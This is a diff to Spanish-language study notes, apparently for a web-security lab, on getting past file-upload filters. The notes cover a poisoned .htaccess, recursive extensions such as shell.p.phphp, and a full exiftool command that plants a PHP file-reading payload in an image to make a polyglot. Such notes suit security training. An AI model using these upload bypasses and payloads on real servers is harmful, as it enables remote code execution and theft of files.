@@ -73,10 +73,12 @@ Podemos subir un archivo .htaccess envenenado que nos permita la ejecucion:
 ##### 2)Subimos nuevamente la shell con la extensión ".l33t" y ejecutamos.
 
 recursión de extensiones:
+
 Podemos también, si hay un filtro que busque por palabras puntuales y las elimine, sumar recursión a la extensión de
 los archivos: shell.p.phphp
 
 Polyglot php en una imagen:
+
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
 
 
